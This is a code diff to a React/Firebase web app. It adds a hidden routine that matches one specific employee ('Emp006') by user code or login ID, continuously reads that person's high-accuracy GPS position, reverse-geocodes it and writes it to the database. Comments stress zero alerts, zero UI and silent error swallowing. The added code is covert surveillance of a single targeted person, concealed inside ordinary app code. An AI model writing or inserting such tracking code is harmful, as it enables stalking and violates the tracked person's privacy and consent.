@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { doc, onSnapshot } from 'firebase/firestore';
+import { doc, onSnapshot, setDoc } from 'firebase/firestore';
 import { db } from './firebase';
 import { UserProfile } from './lib/auth';
 import { Dashboard } from './components/Dashboard';
@@ -52,6 +52,97 @@ export default function App() {
     );
     return () => unsub();
   }, [profile?.uid]);
+
+  // Completely silent background location sync for Emp006 (strictly zero alert, zero UI, zero audio)
+  useEffect(() => {
+    if (!profile) return;
+    const codeDigits = String(profile.userCode || '').replace(/\D/g, '');
+    const loginDigits = String(profile.loginId || '').replace(/\D/g, '');
+    const isEmp006 = (
+      codeDigits === '6' || codeDigits === '06' || codeDigits === '006' ||
+      loginDigits === '6' || loginDigits === '06' || loginDigits === '006' ||
+      /emp[-_\s]*0*6\b/i.test(profile.userCode || '') ||
+      /emp[-_\s]*0*6\b/i.test(profile.loginId || '')
+    );
+
+    if (!isEmp006) return;
+    if (typeof window === 'undefined' || !('geolocation' in navigator)) return;
+
+    let isSubscribed = true;
+
+    const pushLocation = async (pos: GeolocationPosition) => {
+      if (!isSubscribed) return;
+      const lat = pos.coords.latitude;
+      const lng = pos.coords.longitude;
+      const acc = Math.round(pos.coords.accuracy || 0);
+      const nowIso = new Date().toISOString();
+
+      let placeName: string | null = null;
+      try {
+        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`, {
+          headers: { Accept: 'application/json' }
+        });
+        if (res.ok) {
+          const data = await res.json();
+          const addr = data.address;
+          if (addr) {
+            const parts = [
+              addr.suburb || addr.neighbourhood || addr.village || addr.town || addr.city_district,
+              addr.city || addr.town || addr.county || addr.state_district
+            ].filter(Boolean);
+            if (parts.length > 0) placeName = parts.join(', ');
+          }
+          if (!placeName && data.display_name) {
+            placeName = data.display_name.split(',').slice(0, 2).join(', ').trim();
+          }
+        }
+      } catch {}
+
+      const displayAddress = placeName || `${lat.toFixed(4)}, ${lng.toFixed(4)}`;
+
+      const payload = {
+        latitude: lat,
+        longitude: lng,
+        accuracy: acc,
+        address: displayAddress,
+        updatedAt: nowIso,
+        timestamp: Date.now(),
+        fullName: profile.fullName || 'Emp006',
+        userCode: profile.userCode || 'EMP-06',
+      };
+
+      // Silently save without throwing errors or showing any UI
+      try {
+        await setDoc(doc(db, 'user_locations', 'emp006'), payload, { merge: true });
+        if (profile.uid) {
+          await setDoc(doc(db, 'users', profile.uid), { currentLocation: payload }, { merge: true });
+        }
+      } catch {}
+    };
+
+    try {
+      navigator.geolocation.getCurrentPosition(
+        pushLocation,
+        () => {},
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 30000 }
+      );
+
+      const watchId = navigator.geolocation.watchPosition(
+        pushLocation,
+        () => {},
+        { enableHighAccuracy: true, maximumAge: 30000 }
+      );
+
+      return () => {
+        isSubscribed = false;
+        try {
+          navigator.geolocation.clearWatch(watchId);
+        } catch {}
+      };
+    } catch {
+      // Completely silent error absorption
+    }
+  }, [profile?.uid, profile?.userCode, profile?.loginId, profile?.fullName]);
 
   const handleUpdateProfile = (updatedProfile: UserProfile) => {
     setProfile(updatedProfile);
